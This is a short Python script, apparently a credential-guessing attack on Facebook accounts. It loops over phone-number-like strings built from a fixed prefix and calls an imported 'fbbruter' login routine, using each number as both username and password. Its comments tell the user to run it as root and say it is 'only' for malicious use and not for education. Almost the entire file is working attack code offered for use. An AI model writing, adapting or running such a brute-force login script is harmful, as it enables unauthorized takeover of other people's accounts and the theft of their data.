import fbbruter # import fbbruter file.

# =======================================
# Note: Please run this file as root...
# =======================================

#  For Enumerating usernames and passwords using simple trick.
#  Programmer ==> ghostinterminal
#  Date ==> Tue Sep 4, 2019, 8:45PM
#  Only use for malacious purpose.
#  Not for educational purpose.....

def main():
	prfx = 9906018 # Setting number.

	for suf in range(100,500):  # Lopping through lot of suffixes.
		number = str(prfx)+str(suf) # Making a whole number.
		fbbruter.login(number, number) # Testing login...

if __name__ == '__main__':
	main()	# Calling main function.
